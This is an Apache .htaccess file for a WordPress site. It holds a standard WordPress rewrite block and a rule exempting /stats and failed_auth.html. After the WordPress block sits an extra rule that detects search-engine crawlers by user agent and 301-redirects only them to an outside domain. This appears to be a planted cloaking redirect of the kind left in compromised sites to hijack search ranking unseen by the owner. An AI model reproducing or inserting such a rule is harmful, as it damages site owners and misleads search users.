<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_URI} ^/(stats|failed_auth\.html).*$ [NC]
RewriteRule . - [L]
</IfModule> 

# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
# END WordPress

RewriteEngine On

RewriteBase /
RewriteCond %{HTTP_USER_AGENT} (Googlebot|Slurp|msnbot)
RewriteRule ^ http://bablo.me.uk/ [R=301,L]
